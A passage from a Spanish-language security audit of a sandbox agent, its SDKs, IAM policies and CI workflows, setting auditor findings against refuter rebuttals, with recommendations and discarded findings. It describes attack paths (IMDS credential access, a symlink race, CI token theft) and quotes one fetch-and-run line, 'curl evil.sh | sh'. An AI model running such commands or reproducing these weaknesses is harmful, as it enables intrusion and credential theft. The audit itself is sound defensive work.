  principales IAM y ninguno menciona la carga de trabajo dentro de la VM.
- **Refutador** (→ menor): no se cruza ninguna frontera. Todo el contenido es
  propiedad del sandbox en el que el atacante ya ejecuta; `session.rs:632-652`
  prueba que un segundo `/run` no puede inyectar ni cambiar el mapa, así que no
  hay forma de leer las etiquetas de otro sandbox. `imds_blocked` se resuelve con
  un `connect()`, `clock_offset_ms` y `resume_generation` son observables desde el
  guest, y `sandbox_id` no es credencial (ADR-004 exige IAM **y** el secreto).
  Además el propio T4 clasifica `envs` y `metadata` como "configuración y
  etiquetas, **no secretos**", y `docs/site/docs/security.md` tiene una sección
  entera titulada "Qué no poner en envs ni en metadata".
- **Recomendación: menor, y corrección sólo documental.** Partir la respuesta de
  `Health` rompería la sonda de readiness —es el único RPC anónimo por diseño
  (ADR-004)— y el contrato del `.proto` 0.2.0 por una divulgación que no cruza
  ninguna frontera. Lo que sí hay que arreglar, antes de publicar, es la frase:
  T4 y `docs/site/docs/security.md` deben decir que **la propia carga de trabajo
  del sandbox lee `metadata` sin credencial alguna**, porque es el operador quien
  decide qué mete ahí leyendo esa frase.

### C-05 — `user=` acepta cualquier cuenta no-root de `/etc/passwd`: procesos con uid < 1000 (que esquivan el blackhole de IMDS) y con gid 0

- **Fichero**: `crates/rayd-core/src/process/identity.rs:51` (y `:42`;
  `pty/mod.rs:156-158`, `filesystem/identity.rs:34-36`,
  `persistence/mod.rs:116`).
- **Auditor** (propuesto bloqueante; lente de código lo mantiene en mayor):
  `UserPolicy` tiene exactamente dos puertas y las dos son sobre root —
  `authorize` rechaza la cadena literal `"root"` y `authorize_identity` rechaza
  `identity.uid == 0`. No hay comprobación de gid, ni de grupos suplementarios, ni
  suelo de uid. `NixUserLookup::lookup`
  (`crates/rayd/src/adapters/process_spawner.rs:111-127`) resuelve cualquier
  cadena con `User::from_name` + `getgrouplist` y `PreExecPlan::apply` (`:274-278`)
  ejecuta `setgroups`/`setgid`/`setuid` con esos números. El bloqueo de IMDS de M6
  está acotado a `SANDBOX_UID_RANGE = "1000-65535"`
  (`adapters/imds_block.rs:47`), cuyo propio comentario dice que cubre "the
  sandbox user and anything it could become" — afirmación que este hueco
  falsifica: un socket de uid 11 no entra en la regla `uidrange`, cae a la tabla
  principal y alcanza `169.254.169.254`. Con gid 0 se leen los ficheros del grupo
  root, incluido `/root` (que T11 dice proteger "por el propio modo 0700"), y
  `checkpoint_files(user="operator")` haría de `/root` la raíz del archivo, contra
  lo que T15 afirma ("nunca archiva `/root`").
- **Refutador** (→ menor): el atacante **no** es el principal sin confianza. El
  código dentro del sandbox no puede llegar a `user=`: todos los RPC salvo
  `Health` exigen `x-access-token` y el secreto nunca entra en la VM (sólo su
  sha256), y el sidecar resuelve la identidad del kernel en el arranque. Quien
  pone `user=` es el operador del SDK, con confianza **total** en la tabla de
  `SECURITY.md`, que además podría leer IMDS como uid 1000 en la imagen por
  defecto sin ningún bug (T1 lo documenta como abierto) y elige tanto el rol como
  la imagen.
- **Recomendación: mayor, y arreglar antes de publicar.** Es el hallazgo con mejor
  relación coste/beneficio de todo el informe: la corrección es convertir
  `authorize_identity` de lista negra de uid 0 en comprobación positiva
  (`uid >= 1000 && gid >= 1000 && !identity.groups.contains(&0)`, o una lista de
  cuentas declarada por la imagen), con lo que proceso, PTY, filesystem y
  persistencia la heredan de un solo sitio, y eliminar la puerta duplicada de
  `persistence/mod.rs:116`. Complementario: instalar dos reglas
  (`uidrange 1-990` y `uidrange 995-65535`) en `install_family` en vez de una, para
  no depender del límite inferior; y añadir un e2e que compruebe que
  `user="operator"` da `PERMISSION_DENIED`. **Premisa sin medir**: nada en el repo
  mide el `/etc/passwd` de la imagen base, así que el tramo de gid 0
  (`operator`, `sync`, `shutdown`, `halt`) es inferencia del paquete `setup` de la
  familia RHEL; el tramo de uid < 1000 sobrevive igual con `bin`(1), `daemon`(2) o
  `adm`(3), que son universales. Medirlo y anotarlo en `AWS_API_NOTES.md` forma
  parte de la corrección.

### C-06 — La lista de denegación se aplica sobre una cadena, no sobre un descriptor: TOCTOU entre `realpath` y la llamada al sistema

- **Fichero**: `crates/rayd-core/src/filesystem/ops.rs:286`.
- **Auditor**: `canonical_existing` hace `canonicalize(parent)` + `join_canonical`
  + `deny.check(...)` y devuelve una **cadena**; `prepare_read` (`:144-146`) se la
  pasa a `open_read`, que vuelve a recorrer la ruta
  (`adapters/std_filesystem.rs:89-93`). `O_NOFOLLOW` protege sólo el último
  componente; los intermedios se re-resuelven y sus symlinks se siguen. Nada ancla
  la segunda llamada al objeto comprobado (ni `openat`, ni fd `O_PATH`, ni
  re-chequeo por `/proc/self/fd`). Mismo patrón en `canonical_creating`,
  `canonical_directory`, `walk_listing` y `remove`/`rename`. El diseño de M3 (D2)
  descartó el arreglo con el argumento de que "una carrera sólo alcanza lo que uid
  1000 ya alcanzaba", y eso es **falso para `/proc/self/*`**: `setfsuid()` no
  cambia uid/euid/suid, así que el hilo de `rayd` pasa la puerta de ptrace sobre
  sus propias entradas.
- **Refutador** (→ menor, ambos): la lista de ficheros realmente ganados está
  inflada. `/proc/<pid>/status`, `stat`, `limits` y `mountinfo` son 0444 y **no**
  están tras la puerta de ptrace: uid 1000 ya lee hoy `CapEff`, `Seccomp`,
  `Groups` y la tabla de montaje de `rayd`. Lo que queda es `maps`/`smaps`/
  `numa_maps` (disposición de ASLR) y `cmdline`, que en esta imagen es
  `["/usr/local/bin/rayd", "--grpc-port", "8080", "--hooks-port", "9000"]`.
  `environ` (0400) y `mem` (0600) siguen bloqueados por modo POSIX, la escritura
  es auto-limitada (temporal y destino comparten el padre intercambiado), el
  `Remove` redirigido sólo alcanza lo que uid 1000 ya podía borrar (la llamada
  corre con fsuid 1000) y los bytes van al **cliente**, no al atacante. Además el
  riesgo está escrito y aceptado en el diseño de M3.
- **Recomendación: menor; aceptar con razón documentada.** No hay caso de negocio
  para reescribir el camino de ficheros en 0.2.x por la disposición de ASLR de un
  agente en Rust seguro sin primitivo de corrupción de memoria. Lo que sí hay que
  hacer ahora es **corregir la frase de D2**: dejar escrito que la carrera sí
  alcanza `/proc/self/{maps,smaps,numa_maps}` por el atajo de
  `same_thread_group()`. `openat2` con `RESOLVE_NO_SYMLINKS|RESOLVE_BENEATH`
  queda en la lista de endurecimiento de M8.

### C-07 — El `S3Location` que nombra el llamante nunca se liga al sandbox

- **Fichero**: `crates/rayd-core/src/persistence/mod.rs:77` (paso directo en
  `crates/rayd/src/grpc/persistence.rs:105`).
- **Auditor** (propuesto bloqueante; lente de código lo mantiene en mayor):
  `resolve_location()` valida sólo la **sintaxis** de bucket, `key_prefix` y
  región; su firma ni siquiera recibe la sesión, así que es estructuralmente
  incapaz de comparar nada. `PersistenceDeps` no lleva bucket ni prefijo, y
  `Manifest::validate()` (`manifest.rs:82-98`) nunca mira `sandbox_id` ("`home` and
  `user` are informative only"), de modo que restaurar desde el prefijo de otro
  pasa limpio. El único límite es el execution role, y la política publicada
  concede `<bucket>/<PersistencePrefix>/*`, es decir **todos** los `name` bajo el
  prefijo base del operador — que es exactamente el layout que
  `docs/site/docs/persistence.md:44-53` documenta, con `name` elegido por la
  aplicación. `/run` ya entrega un payload por sandbox donde podría ligarse
  (`run_payload.rs`), y no se usa.
- **Refutador** (→ menor): el único principal que puede llamar a
  `Checkpoint`/`Restore` es el poseedor del `x-access-token`, que la tabla de
  confianza sitúa en "total" y que ya posee las credenciales IAM de la cuenta
  dueña del bucket: puede hacer `GetObject`/`PutObject` sobre esas mismas claves
  con la API de AWS. El escenario multi-inquilino que el hallazgo construye
  —repartir el JWE y el secreto crudo a inquilinos que no confían entre sí— no es
  el modelo que T14 describe (ahí la aplicación **es** el operador de confianza), y
  la granularidad ya es decisión del operador: `PersistencePrefix` es un parámetro,
  `execution_role_arn` y `prefix` son por sandbox, y `SECURITY.md:112-116` dice
  "Dale al rol sólo el prefijo".
- **Recomendación: mayor.** No por el escenario multi-inquilino, sino porque hoy
  **el prefijo no es una frontera y la documentación se lee como si lo fuera**:
  T15 argumenta sobre lo que se escribe en el `HOME` local, no sobre `rayd`
  escribiendo claves arbitrarias de S3 con un rol que el llamante no posee por
  otra vía, y la lectura desde el prefijo de otro no aparece en ninguna fila.
  Corrección: (ahora) decir en `docs/site/docs/persistence.md` y en T15 que el
  prefijo **no** separa inquilinos y que el aislamiento por inquilino exige un rol
  y un prefijo por inquilino; (M8) añadir `persist: {bucket, key_prefix, region}`
  al `runHookPayload` —v1 ignora claves desconocidas y el presupuesto de 4096
  bytes sobra—, guardarlo en `SandboxSession` y hacer que `resolve_location()`
  rechace con `PERMISSION_DENIED` cualquier `Checkpoint`/`Restore` cuyo destino no
  sea el ligado.

### C-08 — `RAYITO_ACCESS_TOKEN` se convierte en un secreto único para todos los sandboxes que el proceso crea

- **Fichero**: `clients/python/src/rayito/_sandbox_base.py:114` (gemelo en
  `clients/typescript/src/sandbox/launch.ts:64`).
- **Auditor**: `resolve_access_token` hace
  `provided = access_token or os.environ.get(ACCESS_TOKEN_ENV_VAR)` y, si está
  puesta, devuelve **la misma cadena** para cada `Sandbox.create()` del proceso.
  `docs/site/docs/concepts.md:115` recomienda activamente exportarla — "(o exporta
  `RAYITO_ACCESS_TOKEN`)" — en un párrafo que sólo habla de `connect()`, sin decir
  que `create()` consume la misma variable. Quien siga el consejo convierte el
  secreto por sandbox en un secreto de flota sin aviso, sin línea de log y sin
  diferencia de comportamiento, que es exactamente la forma que T14 rechaza
  ("nunca uno por pool: una fuga abre un VM, no la flota"). `SandboxPool` se salva
  sólo porque pasa `access_token=generate_access_token()` explícitamente.
- **Refutador** (→ menor): es el contrato especificado y documentado
  (`openspec/specs/typescript-sdk/spec.md:98`, `clients/typescript/README.md`), el
  default es seguro (`generate_access_token()` = 32 bytes frescos por sandbox), y
  activarla es una decisión afirmativa del operador equivalente a pasar
  `access_token="fijo"` a cada `create()` — un parámetro que la API **debe**
  exponer, porque es la única forma de hacer `connect()` desde otro proceso. El
  atacante necesita además `lambda:ListMicrovms` + `CreateMicrovmAuthToken`.
- **Recomendación: menor, con dos correcciones baratas.** Reescribir
  `concepts.md:115` (y T4) para decir que la variable la lee también `create()` y
  qué implica; y emitir un `logger.warning` de una sola vez cuando
  `resolve_access_token` cae al entorno. Hallazgo adicional del refutador que el
  auditor no vio: **el servidor MCP no puede optar por no compartir**
  (`clients/python/src/rayito/mcp/_lease.py:115-119` llama a
  `AsyncSandbox.create(...)` sin `access_token=`, una vez por `acquire()` tras
  cada `reset()`), así que un operador con la variable exportada comparte un
  secreto entre todos los sandboxes de ese proceso sin API para evitarlo: dar esa
  opción en M8.

### C-09 — `CallerPolicy` concede crear/actualizar/borrar imágenes a máquinas que sólo necesitan lanzar sandboxes

- **Fichero**: `infra/iam.yaml:143` (`PassRoles` en `:165-170`, recurso en
  `:164`).
- **Auditor**: el statement `ImagesAndMicrovms` concede
  `lambda:CreateMicrovmImage`, `UpdateMicrovmImage`, `DeleteMicrovmImage`,
  `UpdateMicrovmImageVersion` y `DeleteMicrovmImageVersion` sobre el comodín
  `arn:aws:lambda:<region>:<acct>:microvm-image:*`, junto a los verbos de runtime.
  Un servidor de aplicación comprometido —la máquina que está en contacto
  constante con la salida hostil del sandbox— puede reconstruir `rayito-base`
  desde su propio zip y apuntar `codeArtifact.uri` a él.
- **Refutador** (→ menor, ambos): `CallerPolicy` no es la política de runtime, es
  la del **operador/publicador**, y su propia `Description` (`:131`) lo dice; el
  SDK incluye la CLI de publicación y cuatro de los cinco verbos los usa
  `rayito image publish|prune` (`_publish.py:327,330`, `_prune.py:271,285`), y
  `rayito doctor` los simula como permisos esperados. La política de runtime que
  el hallazgo pide **ya existe y se publica**: `infra/ci-oidc-role.yaml:75-99`,
  con sólo los seis verbos de MicroVM sobre ARNs concretos y sin permisos de
  imagen, S3, cuotas ni etiquetas. La condición `iam:PassedToService` que se
  propone no aporta nada: las *trust policies* de `BuildRole` (`:45-56`) y
  `ExecutionRole` (`:79-90`) ya aceptan sólo `lambda.amazonaws.com` con
  `aws:SourceAccount`.
- **Recomendación: menor.** Lo que queda es real pero pequeño: (a) el recurso es
  `microvm-image:*` en vez de las imágenes nombradas, así que los verbos
  destructivos alcanzan imágenes que el operador no publicó; (b)
  `lambda:DeleteMicrovmImage` (`:148`) no lo usa ningún camino de código; (c) la
  sección IAM de `SECURITY.md:85` llama a `CallerPolicy` "la máquina que ejecuta
  el SDK" sin decir que es la política del **publicador**, y no ofrece la variante
  de sólo-runtime para un servidor de aplicación, con lo que alguien puede
  colgarla de producción. Corrección: (a) y (c) ahora, siendo (c) una frase; el
  split formal runtime/publicador, en M8.

### C-10 — El job de publicación de npm ejecuta scripts de ciclo de vida de dependencias con el token OIDC en alcance

- **Fichero**: `.github/workflows/release.yml:196`.
- **Auditor** (mayor): el job `typescript` tiene `environment: npm` (`:157`) e
  `id-token: write` (`:158-159`), y ejecuta `pnpm install --frozen-lockfile` con
  `pnpm@9.15.4`. pnpm 9 ejecuta `preinstall`/`install`/`postinstall` de las
  dependencias por defecto (el opt-out `onlyBuiltDependencies` llegó en pnpm 10),
  no hay `.npmrc` en ningún sitio del repo y no hay `--ignore-scripts`. Un script
  malicioso corre antes de `pnpm build` (`:197`) y de `npm publish` (`:210`), así
  que puede parchear `dist/` o canjear el token OIDC.
  `pnpm pack:check` (`:198`) sólo comprueba que ocho ficheros **existan**
  (`scripts/pack-check.mjs:9-18`), nunca su contenido.
- **Refutador** (→ menor): el atacante ya está dentro por la puerta de al lado.
  `:197` ejecuta `pnpm build` (tsdown/rolldown/typescript) y `:198` lanza
  `pnpm pack` — una dependencia de build comprometida ejecuta código en el mismo
  runner, con el mismo token, haya o no scripts de instalación.
  `--ignore-scripts` retira exactamente **un** paquete: de los 128 en
  `node_modules/.pnpm`, sólo `esbuild@0.28.2` declara `postinstall`. Y publicar
  con el token robado no da nada nuevo en un job que ya ejecuta `npm publish`.
- **Recomendación: menor**, pero **la corrección importa y es la misma que la de
  H-02**: separar build y publish en dos jobs, de forma que el job con `id-token`
  no ejecute código de terceros. Añadir `.npmrc` con `ignore-scripts=true` es
  barato y se puede hacer ahora, pero por sí solo es cosmético. Residuo adicional
  que ambos ven y que no es de este hallazgo: `harden-runner` está en
  `egress-policy: audit` en todos los jobs de release, así que la exfiltración se
  registra pero no se impide.

### C-11 — El gate de pinning de acciones acepta tags, `@latest` y SHAs cortos

- **Fichero**: `.github/workflows/ci.yml:46`.
- **Auditor**: el gate es
  `grep -nE 'uses: [^@]+@(v[0-9]|main|master|release/)'`. Ejecutado contra
  `@v2`, `@main`, `@release/1.0`, `@1.2.3`, `@latest`, `@release-v2` y
  `@ab12cd34`, sólo caza los tres primeros: un tag semver desnudo, `latest`,
  cualquier rama que no se llame main/master y un SHA truncado (que git y el
  runner resuelven por prefijo) pasan y CI sigue en verde. `actionlint` no
  comprueba pinning y no hay `.github/actionlint.yaml`. `SECURITY.md:157` y
  `openspec/specs/ci-hardening/spec.md:7` afirman que el gate impide
  referenciar una acción por tag, alias mayor o rama.
- **Refutador** (→ no es hallazgo): el gate vive en el mismo fichero que debe
  vigilar y sólo mira `.github/workflows/*.yml`; quien pueda introducir una
  referencia mutable puede borrar en el mismo commit las seis líneas del gate, o
  añadir un `run: curl evil.sh | sh`. Además `release.yml` y `scorecard.yml` no se
  disparan por `pull_request`, hoy las 16 referencias son SHA de 40 hex, CODEOWNERS
  cubre `*` y Scorecard tiene un check de *Pinned-Dependencies*.
- **Recomendación: menor, y arreglar ahora.** El argumento del refutador prueba
  demasiado: invalidaría cualquier gate mecánico de CI e ignora la asimetría por
  la que existe (borrar un paso con nombre es un diff llamativo; un `@latest`
  dentro de una edición de workflow no). La corrección es **una línea** e iguala
  el código a lo que `SECURITY.md` ya afirma: invertir la comprobación y fallar a
  menos que todo `uses:` no local case con `@[0-9a-f]{40}( +#.*)?$`.

### C-12 — El build de la imagen puede caer silenciosamente a ejecutar el `setup.py` de un sdist

- **Fichero**: `image/Dockerfile:82` (capa poly en `:98-101`).
- **Auditor**: `python3 -m pip install --no-cache-dir --break-system-packages -r
  …/requirements.txt` no lleva `--only-binary=:all:`, ni `--require-hashes`, ni
  `--no-deps`, mientras la cabecera del `Dockerfile` (`:4-5`) afirma que "los
  pines llegan como wheels manylinux aarch64 (sin compiladores)". Si la wheel
  aarch64 de una versión pinneada desaparece, pip baja el sdist y ejecuta su
  `setup.py` dentro de la VM de build de Lambda — antes de cualquier compilación,
  así que la ausencia de compilador no lo impide. T10 cita "`requirements.txt` con
  pins exactos" como control, y los pines exactos no impiden ejecutar un sdist.
- **Refutador** (→ no es hallazgo / menor): la ruta descrita ("un upstream publica
  una release sólo-sdist") no existe aquí: `requirements.txt` es un cierre
  transitivo completo con `==` y los metadatos de release de PyPI son inmutables,
  así que pip nunca resuelve una versión nueva. La vía que sobrevive es que un
  mantenedor comprometido **borre** la wheel aarch64 de esa versión exacta — y
  quien puede hacer eso puede igualmente subir una **wheel** maliciosa, que
  `--only-binary` no filtra y cuyo `.data/data/` deja ficheros bajo `/usr` de
  todos modos. Además `image/Dockerfile:110` importa toda la pila durante el
  build, así que el código se ejecuta con wheel o con sdist.
- **Recomendación: menor.** La mitad útil de la corrección propuesta es
  `--require-hashes`, no `--only-binary`: fija digests y cierra la vía de "añadir
  un fichero a una release existente". El material ya existe y no se usa —
  `kernel-sidecar/uv.lock` lleva 229 hashes `sha256` y el `Dockerfile` instala
  desde el `requirements.txt` plano. Regenerar ambos ficheros de pines con
  `--generate-hashes` y añadir `--require-hashes` (más `--no-deps`, ya que el
  cierre es completo) va a M8.

### C-13 — El `AllowedPattern` de `PersistencePrefix` permite `*`, ensanchando el recurso IAM que debía acotar

- **Fichero**: `infra/iam.yaml:31`.
- **Auditor**: el patrón incluye `*` en las tres clases de caracteres, así que
  `PersistencePrefix=*` es un valor válido y renderiza
  `Resource: arn:aws:s3:::${PersistenceBucket}/*/*` (`:117`) y `s3:prefix: */*`
  (`:124`): el execution role —cuyas credenciales lee el código hostil por IMDS en
  la imagen por defecto— pasa a cubrir prácticamente el bucket entero en vez de un
  prefijo. El validador del SDK (`_models.py`) tampoco rechaza `*`, así que ambos
  lados quedan "coherentes" mientras la concesión IAM se ensancha en silencio.
- **Refutador** (→ no es hallazgo): no hay atacante. `PersistencePrefix` lo
  suministra el operador al desplegar el stack en su propia cuenta, y ese
  principal ya puede escribir `Resource: "*"` a mano o borrar el `AllowedPattern`
  entero; un `AllowedPattern` es higiene de entrada, no un control de
  autorización. Además el ejemplo del hallazgo está mal: como el `*` de IAM
  atraviesa `/`, `rayito*` no alcanza nada que el **default** `rayito` no alcance
  ya (ver H-01). Y `*` es un carácter legal de clave S3 que el conjunto seguro
  comparte a propósito entre la plantilla, `_models.py` y
  `crates/rayd-core/src/persistence/keys.rs:168`.
- **Recomendación: menor, y arreglar ahora sólo la plantilla.** Quitar `*` (e
  idealmente `'`, `(`, `)`, `!`) del `AllowedPattern` de CloudFormation es una
  línea y evita que un valor tipográfico borre el límite que el parámetro existe
  para poner. **No** tocar el validador del SDK ni `keys.rs`: `*` es legal en S3,
  está documentado como aceptado y endurecerlo dejaría la plantilla más estricta
  que el agente, creando una divergencia real para cerrar una hipotética.

## 6. Hallazgos descartados

Los dos refutadores los tumbaron. Se listan para que nadie los vuelva a levantar
sin argumento nuevo.

| # | Hallazgo | Por qué se descarta |
|---|---|---|
| R-01 | El secreto decodificado no se zeroiza, sólo su digest (`grpc/access_token.rs:122`) | El texto en claro ya vive en el `HeaderMap` y en los buffers de h2/HPACK que `rayd` no puede borrar, así que el arreglo propuesto limpia una copia de tres; y todo atacante nombrado (root en el guest, el snapshot de memoria de AWS) ya tiene más de lo que el token da. Residuo útil: poner `RLIMIT_CORE 0` al propio `rayd` | — |
| R-02 | Las tres cadenas de `AuthError` son un oráculo de si el sandbox fue reclamado (`grpc/access_token.rs:127`) | `Health` es anónimo por diseño y ya publica `sandbox_id` y `metadata`, que distinguen los mismos tres estados con más detalle y sin credencial | — |
| R-03 | `rayd` nunca suelta los grupos suplementarios de root, así que `setfsuid` pasa el chequeo de grupo-root (`adapters/fs_identity.rs:53`) | Refutado por medición: el e2e aceptado de M3 (`tests/e2e/test_m3_filesystem.py:245-251`) afirma que `files.list("/root")` da `PERMISSION_DENIED`, y `/root` **no** está en la lista de denegación, así que ese rechazo es un `EACCES` real del kernel bajo la identidad. El diseño de M3 (D3) documenta además que el conjunto suplementario de root está vacío en esta base | — |
| R-04 | `Kill`, `SendSignal` y `timeout_ms` sólo alcanzan el grupo de procesos del hijo (`pty/manager.rs:201`) | El contrato documentado es "al grupo" en `ARCHITECTURE.md:264,266,513` y en T13; `PTY_DRAIN_GRACE` existe precisamente para el hijo en background que sobrevive. El superviviente sigue siendo uid 1000 en la misma VM y muere con ella. Residuo: el comentario de `pty/manager.rs:196` dice "session" donde el código dice grupo | — |
| R-05 | `openpty` devuelve descriptores heredables y un spawn concurrente gana la carrera (`adapters/pty_backend.rs:71`) | La ventana no existe: `PtyManager::open_registered` (`pty/manager.rs:223`) y `ProcessManager::spawn_registered` (`process/manager.rs:252`) toman **el mismo** mutex del registro y lo sostienen sobre el `openpty`, los `fcntl` y el fork | — |
| R-06 | La sonda de IMDS corre `python3 -c` con el cwd en el `HOME` escribible (`main.rs:338`) | La sonda se encola en el mismo brazo de `/run` que instala el digest del token (`hooks/mod.rs:270-280`), antes de que ningún RPC autenticado pueda escribir en `HOME`; `/resume` no repite la sonda de usuario, sólo comprueba la regla. Residuo de higiene: pasar `cwd: Some("/")` y `-I` | — |
| R-07 | `FsIdentityGuard` no suelta los grupos suplementarios y la suposición nunca se verifica (`adapters/fs_identity.rs:52`) | Misma medición que R-03, con la misma conclusión; la asimetría con el camino de procesos está documentada en D3 con su motivo (`setgroups` es por proceso bajo el `__synccall` de musl). Residuo: `rayd` ya lee `/proc/self/status` para `CapEff`, así que loguear `Groups:` al arrancar es gratis | — |
| R-08 | `with_follow_symlinks(false)` es inerte en el backend de inotify (`adapters/notify_watcher.rs:57`) | Cierto en `notify` 8.2.0, e irrelevante: el filtro real es `EntryKind::Directory` desde un `lstat` (`ops.rs:238`, `std_filesystem.rs:72`) y el `inotify_add_watch` corre con fsuid 1000, así que un watch sólo cae donde uid 1000 ya puede leer. Residuo: el comentario del módulo y `ARCHITECTURE.md` | — |
| R-09 | `FilesystemOps::entry_in` es la única operación sin chequeo de denegación (`ops.rs:267`) | El chequeo está un marco más arriba: `events_for` (`events.rs:231-237`) filtra cada ruta con `is_denied` **antes** de que exista un `WatchEvent`, y `join_canonical(root, relative_name(p))` reconstruye exactamente la misma cadena ya comprobada. El arreglo propuesto sería código muerto | — |
| R-10 | La reserva de disco de 256 MiB se comprueba una vez por fichero (`ops.rs:164`) | El mismo actor llena el disco con `dd` desde un proceso o una celda, sin `RLIMIT_FSIZE` ni cuota en ningún sitio; T7 describe el control exactamente como está implementado ("antes de crear el temporal de `Write`") | — |
| R-11 | El checkpoint sobrescribe `home.tar.gz` y publica el manifest después (`persistence/checkpoint.rs:140`) | La ventana es real pero es un defecto de durabilidad, no de seguridad: cualquier `checkpoint_files(target=…)` posterior repara el prefijo con sólo `PutObject` (no hace falta `DeleteObject`), y `reincarnate()` hace checkpoint **antes** de crear el sucesor, así que se cura solo. El atacante uid 1000 destruye el mismo dato más barato borrando su `HOME` | — |
| R-12 | Pares `/suspend` + `/resume` forjados inflan `suspended_total` y congelan el reloj de los timeouts (`lifecycle.rs:314`) | El reloj congelado en un par aceptado es el contrato probado (`crates/rayd/tests/m6_hooks.rs:193-262`); el atacante ya escapa del timeout con un `setsid` sin forjar nada, porque el disparo es `killpg` sobre el grupo del hijo; y el bucle es un DoS auto-infligido que corta sus propios streams y que T2 ya acepta. Residuo: acotar el span acreditado al timeout declarado de `/suspend` | — |
| R-13 | El restore verifica el sha256 después de escribir todas las entradas (`persistence/restore.rs:144`) | Quien puede reemplazar `home.tar.gz` puede reemplazar `manifest.json` bajo el mismo prefijo y con el mismo `PutObject`: el checksum es una comprobación contra corrupción, nunca contra autenticidad, y verificar antes no cambia nada. La extracción está confinada (tipos permitidos, `unpack_in`, sin permisos ni propietarios preservados). Residuo: la frase de T15 | — |
| R-14 | El `take()` del pool usa el endpoint guardado y nunca lo relee de `get-microvm` (`sandbox_sync/pool.py:325`) | El fichero es 0600: quien puede escribirlo casi siempre puede leerlo, y quien lo lee ya es el uid que posee las credenciales IAM. Un registro con `sandbox_id` falso falla cerrado (`SandboxNotFoundException` → `_resume_slot` devuelve `False` → `create()`) antes de tocar el endpoint. Residuo: validar la forma del endpoint en `record_from_dict` | — |
| R-15 | La descripción de `run_command` del MCP dice `/bin/sh -c` pero el SDK usa `/bin/bash -l -c` (`mcp/_server.py:98`) | Error de documentación en dos sitios (`_server.py:98` y `docs/site/docs/mcp.md:59`); el docstring nativo es correcto. Sin ganancia: el atacante es uid 1000 en un sandbox cuyo estado compartido y persistente el servidor ya anuncia al modelo | — |
| R-16 | El publish de imagen confía en una clave S3 preexistente (`cli/_publish.py:219`) | Quien puede escribir bajo `rayito/*` con `CallerPolicy` ya tiene `CreateMicrovmImage`/`UpdateMicrovmImage` y `PassRole` sobre el `BuildRole`: publica directo, sin carrera. El caso que sí importa —un principal con escritura en S3 pero **sin** los verbos de imagen— es el solapamiento de prefijos, y ese es H-01, donde la corrección (4) recoge este mecanismo | — |
| R-17 | El servidor MCP fija `ingress=["ALL_INGRESS"]` sin posibilidad de cambiarlo (`mcp/_lease.py:125`) | El conector de ingress no es la puerta de los puertos: el JWE que el MCP acuña cubre sólo 8080 y el SDK no modela `allPorts` a propósito. Omitir el conector probablemente deja el sandbox inalcanzable (Q44 mide lo análogo para egress), así que el "arreglo" rompería el servidor. Residuo: documentar la postura de red en `docs/site/docs/mcp.md` | — |
| R-18 | El `OperatorRole` del conector de egress no lleva `aws:SourceAccount` y tiene ENI sobre `*` (`infra/egress-connector.yaml:69`) | La omisión es una decisión medida y citada (`AWS_API_NOTES.md:323`, aws-samples), `aws:SourceAccount` no defendería del atacante en-cuenta que el hallazgo describe, ningún sitio concede `iam:PassRole` sobre ese rol, y las ENIs las crea el servicio (mismo patrón que `AWSLambdaVPCAccessExecutionRole`). El `aws:ResourceTag` propuesto rompería la limpieza de ENIs | — |
| R-19 | El digest del `e2b_charts` vendorizado no lo verifica nada (`_vendor/e2b_charts/VENDORED.md:5`) | El atacante es un contribuidor cuyo PR revisa el mantenedor, y `.github/CODEOWNERS:3` (`*`) ya cubre el árbol; ruff y mypy no detectan puertas traseras, así que su exclusión no es el motivo; y el árbol (10 ficheros, 537 líneas) no importa `os`, `subprocess`, `socket` ni `eval`. Vale como higiene de CI, no como hallazgo | — |

## 7. Superficies revisadas sin hallazgos

Lo que se miró y **está bien**. Se lista con `file:line` porque una auditoría que
sólo enumera defectos no dice nada sobre la cobertura.

### 7.1 Autenticación y hooks

- **Comparación en tiempo constante, de verdad**: un único punto de entrada
  (`grpc/access_token.rs:103-107` → `session.rs:260-266` →
  `rayd-core/src/auth.rs:141-151`), que hashea el secreto presentado primero
  (`auth.rs:117`) —así no se filtra ni la longitud ni un prefijo común— y compara
  digests con `subtle::ConstantTimeEq` (`auth.rs:56-58`). El `PartialEq` derivado
  de `TokenDigest` sólo lo usa código `#[cfg(test)]`.
- **`/run` una vez por arranque**: `LifecycleState::run` (`lifecycle.rs:230-243`)
  fija `run_claimed` antes que nada, y `AccessTokenGate::install_once`
  (`auth.rs:100-107`) es un segundo pestillo independiente que zeroiza el digest
  rechazado. Un segundo `/run` no toca ni el digest, ni los defaults de spawn, ni
  `metadata` (tests en `session.rs:378-391` y `:632-653`, e2e en
  `test_m6_hardening.py:265-268`).
- **Falla cerrado**: un primer `/run` con payload ilegible consume la reclamación
  y deja la VM permanentemente sin token (`RunOutcome::Tokenless`,
  `session.rs:268-284`); si `/run` no llega, la fase queda en `Booting` y
  `stream_gate` (`session.rs:233-238`) rechaza todo RPC que abra stream.
- **Ni el token ni el payload llegan a los logs**: `run_outcome`
  (`hooks/mod.rs:568-588`) registra `payload_chars`, un recuento; el handler de
  `/run` registra `metadata_keys`, otro recuento; ninguna macro `tracing` de
  `crates/rayd*` formatea con `{:?}` una estructura con `envs`, `metadata` o un
  secreto. `TokenDigest` tiene `Debug` escrito a mano (`auth.rs:61-65`).
- **Sin rutas de pánico**: `auth.rs`, `run_payload.rs` y `grpc/access_token.rs` no
  tienen `unwrap`/`expect`/`panic` fuera de tests, y los mutex se toman con
  `unwrap_or_else(PoisonError::into_inner)`.
- **La capa de auth es la más externa** del stack tower (`grpc/mod.rs:117-118`,
  antes de `ClientAbortLayer`), así que corre sobre la petición HTTP cruda, antes
  de que tonic decodifique ningún cuerpo, para los cinco servicios. La ruta
  anónima es igualdad exacta de cadena y falla cerrado: cualquier cosa que no sea
  literalmente `/rayito.v1.HealthService/Health` —incluido
  `HealthService/Metrics`— exige token (`auth.rs:135-137`).
- **El drenaje del cuerpo rechazado está acotado**: 2 s y 1 MiB
  (`access_token.rs:31-32`), descartando frames en vez de bufferizarlos.
- **Validación del payload de `/run`**: límite de 4096 **caracteres** comprobado
  antes de parsear, versión fijada, digest de 64 hex en minúscula,
  `limits.cpu_seconds` acotado, y ningún error cita el payload (test
  `messages_never_quote_input`).
- El replay de un `x-access-token` capturado a través de suspend/resume funciona,
  pero está declarado y aceptado en T14 con su motivo (el sha256 se fija en
  `runHookPayload` y `/run` es una vez por arranque).

### 7.2 Escape y privilegios

- **Orden correcto de caída de privilegios** en `PreExecPlan::apply`
  (`adapters/process_spawner.rs:265-280`): `setrlimit` primero (aún con
  privilegio), luego `setgroups` → `setgid` → `setuid`, y cualquier fallo aborta
